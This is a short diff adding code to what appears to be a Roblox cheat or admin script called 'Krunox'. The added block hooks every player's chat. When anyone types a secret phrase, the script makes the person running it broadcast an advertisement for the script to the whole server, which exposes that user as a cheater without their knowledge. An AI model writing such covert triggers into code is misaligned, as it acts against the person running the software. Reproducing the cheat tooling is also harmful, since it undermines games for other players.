@@ -837,6 +837,32 @@ wait(3)
 notify("Defualt Prefix is ':' ")
 wait(2)
 notify("Press Qoute for CmdBar")
+
+
+-- stuff for checking krunox users lollll
+function output(msg)
+if string.sub(msg, 1,14) == ">:whoiskrunoxu"  then
+local A_1 = "GET SCRIPT KRUNOX TODAY ON GETRENQ PROFILE"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+end
+end
+
+for i,v in pairs(game.Players:GetChildren()) do
+v.Chatted:Connect(function(msg)
+output(msg)
+end)
+end
+ 
+game.Players.ChildAdded:Connect(function(plr)
+if plr:IsA("Player") then
+plr.Chatted:Connect(function(msg)
+output(msg)
+end)
+end
+end)
+
 while true do
 for i = 1, 360 do
 thearrow.TextColor3 = Color3.fromHSV(i / 360, 1, 1)
